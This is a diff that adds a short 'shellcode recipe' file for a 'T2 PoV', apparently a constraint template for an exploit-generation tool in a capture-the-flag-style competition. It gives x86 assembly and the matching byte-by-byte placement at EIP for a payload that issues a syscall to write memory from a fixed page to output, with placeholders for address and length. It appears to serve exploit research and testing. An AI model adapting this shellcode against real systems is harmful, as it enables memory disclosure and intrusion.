@@ -1,0 +1,39 @@
+# Shellcode recipe for T2 PoV
+# shellcode: 
+# xor eax,eax
+# xor ebx,ebx
+# xor edx,edx
+# mov al,0x2
+# mov bl,0x1
+# mov ecx,0x4347XXXX
+# mov dh, YY
+# mov dl, YY
+# xor esi, esi
+# int 0x80
+*type 2*
+*skip = 0*
+*EIP points to executable memory*
+[EIP+0] == 0x31
+[EIP+1] == 0xc0
+[EIP+2] == 0x31
+[EIP+3] == 0xdb
+[EIP+4] == 0x31
+[EIP+5] == 0xd2
+[EIP+6] == 0xb0
+[EIP+7] == 0x02
+[EIP+8] == 0xb3
+[EIP+9] == 0x01
+[EIP+10] == 0xb9
+[EIP+11] == $addr[0]
+[EIP+12] == $addr[1]
+[EIP+13] == 0x47
+[EIP+14] == 0x43
+[EIP+15] == 0xb2
+[EIP+16] == $size[0]
+[EIP+17] == 0xb6
+[EIP+18] == $size[1]
+[EIP+19] == 0x31
+[EIP+20] == 0xf6
+[EIP+21] == 0xcd
+[EIP+22] == 0x80
+
